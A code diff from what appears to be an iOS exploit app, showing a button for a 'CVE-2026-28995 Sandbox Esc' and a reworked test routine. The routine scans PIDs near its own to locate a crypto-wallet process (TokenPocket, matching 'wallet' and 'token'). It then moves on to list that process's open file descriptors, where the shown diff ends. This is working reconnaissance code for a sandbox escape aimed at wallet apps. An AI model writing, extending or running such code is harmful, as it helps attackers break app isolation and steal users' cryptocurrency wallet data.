@@ -719,7 +719,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v28" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v29" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7431,8 +7431,8 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
-    // Test 11: sysctl(KERN_PROC_ALL) → proc_pidinfo FD enumeration (v28)
-    [log appendString:@"\n--- Test 11: sysctl proc enum + FD paths (v28) ---\n"];
+    // Test 11: PID neighborhood scan → proc_pidinfo FD enumeration (v29)
+    [log appendString:@"\n--- Test 11: PID scan + FD paths (v29) ---\n"];
 
     // Resolve proc_pidinfo/proc_pidfdinfo via dlsym (same as v27)
     ProcPidinfoFn proc_pidinfo_fn = (ProcPidinfoFn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
@@ -7445,72 +7445,46 @@ static void *iohid_threadCopyEvent(void *arg) {
         return;
     }
 
-    // === Part A: sysctl KERN_PROC_ALL — find TokenPocket PID ===
-    [log appendString:@"\n[Part A] sysctl(KERN_PROC_ALL) — enumerate all processes:\n"];
+    // === Part A: PID neighborhood scan — find TokenPocket PID (v29) ===
+    [log appendString:@"\n[Part A] PID neighborhood scan (our_pid ± 60):\n"];
 
-    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL};
-    size_t bufSize = 0;
-
-    // First call: get needed buffer size
-    if (sysctl(mib, 3, NULL, &bufSize, NULL, 0) != 0) {
-        [log appendFormat:@"  sysctl size probe failed: errno=%d (%s)\n", errno, strerror(errno)];
-        [log appendString:@"  (expected — retrying with fixed 256KB buffer)\n"];
-        bufSize = 256 * 1024;
-    }
-    [log appendFormat:@"  Buffer size: %zu bytes\n", bufSize];
-
-    uint8_t *procBuf = (uint8_t *)malloc(bufSize);
-    if (!procBuf) {
-        [log appendString:@"  FATAL: malloc failed\n"];
-        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-        return;
-    }
-    memset(procBuf, 0, bufSize);
-    size_t len = bufSize;
-
-    int sret = sysctl(mib, 3, procBuf, &len, NULL, 0);
-    if (sret != 0) {
-        [log appendFormat:@"  [-] sysctl(KERN_PROC_ALL) FAILED: errno=%d (%s)\n", errno, strerror(errno)];
-        free(procBuf);
-        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-        return;
-    }
-    [log appendFormat:@"  [+] Got %zu bytes of process data\n", len];
-
-    // Parse kinfo_proc array — each entry is sizeof(struct kinfo_proc)
-    // Scan raw buffer for "Global" or "Wallet" command names
+    int myPid = getpid();
     int tpPid = -1;
-    size_t entrySize = sizeof(struct kinfo_proc);
-    int numEntries = (int)(len / entrySize);
-    [log appendFormat:@"  Entry size: %zu, Entries: %d\n", entrySize, numEntries];
+    [log appendFormat:@"  Our PID: %d, scanning range [%d, %d]\n", myPid, myPid-60, myPid+60];
 
     int foundCount = 0;
-    for (int i = 0; i < numEntries; i++) {
-        struct kinfo_proc *kp = (struct kinfo_proc *)(procBuf + i * entrySize);
-        const char *comm = kp->kp_proc.p_comm;
-        if (strstr(comm, "Global") || strstr(comm, "Wallet") ||
-            strstr(comm, "global") || strstr(comm, "wallet") ||
-            strstr(comm, "token") || strstr(comm, "Token")) {
-            [log appendFormat:@"  [#%d] PID=%d comm='%s'\n",
-                foundCount++, kp->kp_proc.p_pid, comm];
-            if (tpPid < 0) tpPid = kp->kp_proc.p_pid;
+    for (int probePid = myPid - 60; probePid <= myPid + 60; probePid++) {
+        if (probePid <= 0) continue;
+        struct proc_bsdshortinfo info;
+        memset(&info, 0, sizeof(info));
+        int ret = proc_pidinfo_fn(probePid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
+        if (ret > 0 && info.pbsi_pid == probePid) {
+            const char *comm = info.pbsi_comm;
+            if (strstr(comm, "Global") || strstr(comm, "Wallet") ||
+                strstr(comm, "global") || strstr(comm, "wallet") ||
+                strstr(comm, "token") || strstr(comm, "Token")) {
+                [log appendFormat:@"  [#%d] PID=%d comm='%s' uid=%d\n",
+                    foundCount++, info.pbsi_pid, comm, info.pbsi_uid];
+                if (tpPid < 0) tpPid = info.pbsi_pid;
+            }
         }
     }
-    [log appendFormat:@"  Scanned %d entries, found %d matching\n", numEntries, foundCount];
+    [log appendFormat:@"  Scanned 121 PIDs, found %d matching\n", foundCount];
 
     if (tpPid < 0) {
-        // Dump first 50 process names for debugging
-        [log appendString:@"  No match. First 50 processes:\n"];
-        for (int i = 0; i < numEntries && i < 50; i++) {
-            struct kinfo_proc *kp = (struct kinfo_proc *)(procBuf + i * entrySize);
-            if (kp->kp_proc.p_pid > 0 && strlen(kp->kp_proc.p_comm) > 0)
-                [log appendFormat:@"    PID=%d '%s'\n", kp->kp_proc.p_pid, kp->kp_proc.p_comm];
+        // Dump all successful PID queries for debugging
+        [log appendString:@"  No match. Dumping all reachable PIDs:\n"];
+        for (int probePid = myPid - 60; probePid <= myPid + 60; probePid++) {
+            if (probePid <= 0) continue;
+            struct proc_bsdshortinfo info;
+            memset(&info, 0, sizeof(info));
+            int ret = proc_pidinfo_fn(probePid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
+            if (ret > 0 && info.pbsi_pid == probePid && strlen(info.pbsi_comm) > 0)
+                [log appendFormat:@"    PID=%d '%s' uid=%d\n", info.pbsi_pid, info.pbsi_comm, info.pbsi_uid];
         }
-        free(procBuf);
         dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
         return;
     }
-    free(procBuf);
     [log appendFormat:@"  [+] Target PID: %d\n", tpPid];
 
     // === Part B: List TokenPocket's open file descriptors ===
